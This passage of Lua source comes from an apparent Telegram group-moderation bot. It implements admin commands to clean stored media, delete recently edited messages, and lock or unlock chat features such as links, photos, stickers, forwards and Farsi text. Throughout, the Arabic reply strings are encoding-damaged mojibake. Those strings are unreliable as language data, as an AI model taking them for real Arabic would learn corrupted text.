Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« *ΩΨ§ΨͺΩΨ¬Ψ― ΩΨ¬ΩΩΨΉΨ§Ψͺ ΩΩΩΩΩ*', 1, 'md')   
else
local mustafagp2 = (w + q)
local mustafagp3 = #group - mustafagp2
if q == 0 then
mustafagp2 = ''
else
mustafagp2 = '\nβ β« ΨͺΩΩΩΩ Ψ­Ψ°Ω β { '..q..' } ΩΨ¬ΩΩΨΉΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ'
end
if w == 0 then
mustafagp1 = ''
else
mustafagp1 = '\nβ β« ΨͺΩΩΩΩ Ψ­Ψ°Ω β { '..w..' } ΩΨ¬ΩΩΨΉΩ Ψ¨Ψ³Ψ¨Ψ¨ ΨͺΩΨ²ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΩ ΨΉΨΆΩΩΩΩ'
end
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΨΉΨ―Ψ― Ψ§ΩΩΨ±ΩΨ¨Ψ§Ψͺ Ψ§ΩΨ§Ω β { '..#group..' }'..mustafagp1..''..mustafagp2..'\nβ β« Ψ§ΩΨΉΨ―Ψ― Ψ§ΩΨ­ΩΩΩΩ Ψ§ΩΨ§Ω  β ( '..mustafagp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
end 
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ³Ψ­" and Constructor(msg) and ChCheck(msg) then
local mustafaTEAM = '*β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β * '..mfmRank(msg)..' \n*β β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ³Ψ­ Ψ¨ΩΨ¬Ψ§Ψ­*'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:Clean'..msg.chat_id_,true)  
end
--     Source Escobar     --
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ³Ψ­" and Constructor(msg) and ChCheck(msg) then
local mustafaTEAM = '*β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β * '..mfmRank(msg)..' \n*β β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ³Ψ­ Ψ¨ΩΨ¬Ψ§Ψ­*'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:Clean'..msg.chat_id_) 
end
if msg and Devmfm:get(mustafa..'mfm:Lock:Clean'..msg.chat_id_) and Devmfm:scard(mustafa.."mfm:cleaner"..msg.chat_id_) >= 200 then 
local List = Devmfm:smembers(mustafa.."mfm:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
SendText(msg.chat_id_,"*β β« ΨͺΩ Ψ­Ψ°Ω* "..Del.." ΩΩ Ψ§ΩΩΩΨ―ΩΨ§ ΨͺΩΩΨ§Ψ¦ΩΨ§",0,'md') 
mfm:del(mustafa.."mfm:cleaner"..msg.chat_id_)
end
if Cleaner(msg) then
if Devmfm:get(mustafa..'mfm:Lock:Clean'..msg.chat_id_) then 
if text == "Ψ§ΩΩΩΨ―ΩΨ§" and ChCheck(msg) or text == "ΨΉΨ―Ψ― Ψ§ΩΩΩΨ―ΩΨ§" and ChCheck(msg) then 
local M = Devmfm:scard(mustafa.."mfm:cleaner"..msg.chat_id_)
if M ~= 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« ΨΉΨ―Ψ― Ψ§ΩΩΩΨ―ΩΨ§ β* "..M, 1, 'md') 
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« ΩΨ§ΨͺΩΨ¬Ψ― ΩΩΨ―ΩΨ§ ΩΩΩΨ’*", 1, 'md') 
end end
if text == "Ψ§ΩΨ³Ψ­" and ChCheck(msg) or text == "ΨͺΩΨΈΩΩ ΩΩΨ―ΩΨ§" and ChCheck(msg) or text == "ΨͺΩΨΈΩΩ Ψ§ΩΩΩΨ―ΩΨ§" and ChCheck(msg) then
local List = Devmfm:smembers(mustafa.."mfm:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
if Del ~= 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω* "..Del.."* ΩΩ Ψ§ΩΩΩΨ―ΩΨ§*", 1, 'md') 
Devmfm:del(mustafa.."mfm:cleaner"..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« ΩΨ§ΨͺΩΨ¬Ψ― ΩΩΨ―ΩΨ§ ΩΩΩΨ’*", 1, 'md') 
end end 
end
end
--     Source Escobar     --
if Admin(msg) then
if text == "ΨͺΩΨΈΩΩ ΨͺΨΉΨ―ΩΩ" or text == "ΨͺΩΨΈΩΩ Ψ§ΩΨͺΨΉΨ―ΩΩ" and ChCheck(msg) then   
mfm_Del = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
mfm_Del[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = mfm_Del},function(arg,data)
new = 0
mfm_Del2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
mfm_Del2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,mfm_Del2)
end,nil)  
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΨͺΩΩΩΩ ΨͺΩΨΈΩΩ 100 ΩΩ Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΩΨΉΨ―ΩΩ*', 1, 'md')
end
--     Source Escobar     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^ΩΨͺΨ­ (.*)$") then
local UnLockText = {string.match(text, "^(ΩΨͺΨ­) (.*)$")}
if UnLockText[2] == "Ψ§ΩΨͺΨΉΨ―ΩΩ" then
if Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨͺΨΉΨ―ΩΩ")  
Devmfm:del(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨͺΨΉΨ―ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΨͺΨΉΨ―ΩΩ Ψ§ΩΩΩΨ―ΩΨ§" or UnLockText[2] == "ΨͺΨΉΨ―ΩΩ Ψ§ΩΩΩΨ―ΩΨ§" then
if Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ ΨͺΨΉΨ―ΩΩ Ψ§ΩΩΩΨ―ΩΨ§*")  
Devmfm:del(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΨΉΨ―ΩΩ Ψ§ΩΩΩΨ―ΩΨ§ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ" then
if Devmfm:get(mustafa..'mfm:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ*")  
Devmfm:del(mustafa..'mfm:Lock:Farsi'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΩΨ΄Ψ§Ψ±" then
if not Devmfm:get(mustafa..'mfm:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΩΨ΄Ψ§Ψ±")  
Devmfm:set(mustafa..'mfm:Lock:Fshar'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΩΨ΄Ψ§Ψ± Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΨ·Ψ§Ψ¦ΩΩΩ" then
if not Devmfm:get(mustafa..'mfm:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨ·Ψ§Ψ¦ΩΩΩΩ°Ω")  
Devmfm:set(mustafa..'mfm:Lock:Taf'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ·Ψ§Ψ¦ΩΩΩΩ°Ω Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΩΩΨ±" then
if not Devmfm:get(mustafa..'mfm:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ±")  
Devmfm:set(mustafa..'mfm:Lock:Kfr'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΩΩΨ± Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" then
if Devmfm:get(mustafa..'mfm:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―")  
Devmfm:del(mustafa..'mfm:Lock:FarsiBan'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ― Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­Ω', 1, 'md')
end
end
if UnLockText[2] == "Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ" or UnLockText[2] == "Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" or UnLockText[2] == "Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" or UnLockText[2] == "Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ¨Ψ§ΩΨͺΩΩΨ―" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ")  
Devmfm:del(mustafa.."mfm:Lock:Bots"..msg.chat_id_)  
end
if UnLockText[2] == "Ψ§ΩΨͺΩΨ±Ψ§Ψ±" then 
Devmfm:hdel(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨͺΩΨ±Ψ§Ψ±")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ" then
if Devmfm:get(mustafa..'mfm:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΨͺΨ­ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ")  
Devmfm:del(mustafa..'mfm:Lock:Pin'..msg.chat_id_)
Devmfm:srem(mustafa.."mfm:Lock:Pinpin",msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΨͺΩΨ­ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end end end
end
end
--     Source Escobar     --
if Admin(msg) then
if text and text:match("^ΩΩΩ (.*)$") then
local LockText = {string.match(text, "^(ΩΩΩ) (.*)$")}
if LockText[2] == "Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω" then
if not Devmfm:get(mustafa..'mfm:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω*")  
Devmfm:set(mustafa..'mfm:Lock:Text'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΨ§ΩΩΩΨ§ΩΩ" then
if not Devmfm:get(mustafa..'mfm:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨ§ΩΩΩΨ§ΩΩ")  
Devmfm:set(mustafa..'mfm:Lock:Inline'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ§ΩΩΩΨ§ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΨ΅ΩΨ±" then
if not Devmfm:get(mustafa..'mfm:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨ΅ΩΨ±")  
Devmfm:set(mustafa..'mfm:Lock:Photo'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ΅ΩΨ± Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΩΩΨ§ΩΨ΄" then
if not Devmfm:get(mustafa..'mfm:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄")  
Devmfm:set(mustafa..'mfm:Lock:Spam'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΩΩΨ§ΩΨ΄ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΨ―Ψ?ΩΩ" then
if not Devmfm:get(mustafa..'mfm:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨ―Ψ?ΩΩ")  
Devmfm:set(mustafa..'mfm:Lock:Join'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ―Ψ?ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΩΩΨ―ΩΩ" then
if not Devmfm:get(mustafa..'mfm:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΩΩΩΩ°Ψ―ΩΩ")  
Devmfm:set(mustafa..'mfm:Lock:Videos'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΩΩΩΩ°Ψ―ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΩΨͺΨ­Ψ±ΩΩ" then
if not Devmfm:get(mustafa..'mfm:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ")  
Devmfm:set(mustafa..'mfm:Lock:Gifs'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΩΨͺΨ­Ψ±ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΨ§ΨΊΨ§ΩΩ" then
if not Devmfm:get(mustafa..'mfm:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ")  
Devmfm:set(mustafa..'mfm:Lock:Music'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ§ΨΊΨ§ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΨ΅ΩΨͺ" then
if not Devmfm:get(mustafa..'mfm:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨ΅ΩΨͺ")  
Devmfm:set(mustafa..'mfm:Lock:Voice'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ΅ΩΨͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·" then
if not Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·")  
Devmfm:set(mustafa..'mfm:Lock:Links'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ±ΩΨ§Ψ¨Ψ· Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΩΩΨ§ΩΨΉ" then
if not Devmfm:get(mustafa..'mfm:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΩΩΨ§ΩΨΉ")  
Devmfm:set(mustafa..'mfm:Lock:Location'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΩΩΨ§ΩΨΉ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΩΨΉΨ±Ω" or LockText[2] == "Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ" then
if not Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ")  
Devmfm:set(mustafa..'mfm:Lock:Tags'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΩΩΩΨ§Ψͺ" then
if not Devmfm:get(mustafa..'mfm:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ")  
Devmfm:set(mustafa..'mfm:Lock:Document'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΩΩΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΩΨ§Ψ΄ΨͺΨ§Ω" or LockText[2] == "Ψ§ΩΨͺΨ§Ω" then
if not Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΩΨ§Ψ΄ΨͺΨ§Ω")  
Devmfm:set(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΩΨ§Ψ΄ΨͺΨ§Ω Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΨ¬ΩΨ§Ψͺ" then
if not Devmfm:get(mustafa..'mfm:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ")  
Devmfm:set(mustafa..'mfm:Lock:Contact'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'οΈβ β« Ψ§ΩΨ¬ΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΨ΄Ψ¨ΩΨ§Ψͺ" then
if not Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨ΄Ψ¨ΩΨ§Ψͺ")  
Devmfm:set(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_,true) 
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ΄Ψ¨ΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΨΉΨ±Ψ¨ΩΩ" then
if not Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨΉΨ±Ψ¨ΩΩ*")  
Devmfm:set(mustafa..'mfm:Lock:Arabic'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨΉΨ±Ψ¨ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΨ§ΩΩΩΩΨ²ΩΩ" then
if not Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨ§ΩΩΩΩΨ²ΩΩ*")  
Devmfm:set(mustafa..'mfm:Lock:English'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ§ΩΩΩΩΨ²ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ" then
if not Devmfm:get(mustafa..'mfm:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ*")  
Devmfm:set(mustafa..'mfm:Lock:Stickers'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ" then
if not Devmfm:get(mustafa..'mfm:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ*")  
Devmfm:set(mustafa..'mfm:Lock:Markdown'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ" then
if not Devmfm:get(mustafa..'mfm:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ*")  
Devmfm:set(mustafa..'mfm:Lock:TagServr'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΨͺΩΨ¬ΩΩ" then
if not Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
